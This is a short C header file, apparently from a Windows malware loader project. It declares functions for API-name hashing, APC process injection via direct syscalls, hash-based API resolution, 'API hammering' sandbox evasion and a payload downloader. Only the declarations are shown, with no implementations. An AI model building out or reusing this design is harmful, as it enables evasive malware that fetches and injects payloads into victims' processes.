#pragma once

#include <Windows.h>

// winapi.c
#define INITIAL_SEED	8

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);

#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))

// inject.c
BOOL ApcInjectionViaSyscalls(HANDLE hProcess, HANDLE hThread, PVOID pPayload, SIZE_T sSize);
void RandomFunction();
BOOL InitiateInjection(PVOID pPayload, SIZE_T sSize);

// apihashing.c
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);
HMODULE GetModuleHandleH(DWORD dwModuleNameHash);

// apihammer.c
BOOL ApiHammering(DWORD Stress);

// downloader.c
DWORD Download(char** response, PVOID url, PVOID endpoint);